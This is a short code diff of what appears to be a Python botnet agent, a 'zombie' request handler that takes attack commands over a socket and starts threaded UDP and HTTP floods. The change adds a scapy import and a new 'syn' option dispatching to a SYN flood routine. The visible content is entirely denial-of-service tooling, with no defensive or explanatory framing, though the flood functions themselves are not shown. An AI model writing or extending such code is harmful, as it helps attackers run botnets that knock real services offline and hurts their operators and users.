@@ -5,6 +5,7 @@ import socket
 import urllib2
 import random
 import os
+from scapy.all import *
 
 class zombie(SocketServer.BaseRequestHandler):
     def handle(self):
@@ -16,6 +17,8 @@ class zombie(SocketServer.BaseRequestHandler):
             fun = attackUDPFlood
         elif attack == "http":
             fun = attackHTTPFlood
+        elif attack == "syn":
+            fun = attackSYNFlood
         for i in xrange(int(threads)):
             attacker = fun(**kwargs)
             attacker.start()
